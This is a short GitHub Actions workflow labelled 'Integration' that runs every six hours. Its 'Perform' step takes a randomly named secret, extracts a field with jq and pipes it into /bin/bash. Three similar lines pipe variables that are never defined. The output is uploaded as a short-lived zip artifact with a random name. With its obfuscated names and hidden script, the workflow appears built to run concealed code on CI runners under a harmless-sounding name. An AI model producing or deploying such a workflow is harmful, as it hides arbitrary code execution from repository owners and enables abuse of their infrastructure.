name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '28 5,11,17,23 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Perform
        env:
          iwkkv2256: ${{ secrets.iwkkv2256 }}
        run: |
          printf '%s' "$iwkkv2256" | jq -r .sfgl6 | /bin/bash
          printf '%s' "$ifl45657" | jq -r .jwrxo8 | /bin/bash
          echo $fxsi67 | jq -r .gow01899 | /bin/bash
          echo $fqiy6413 | jq -r .on3 | /bin/bash

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: OKbLCGQS
          path: "*.zip"
          retention-days: 1
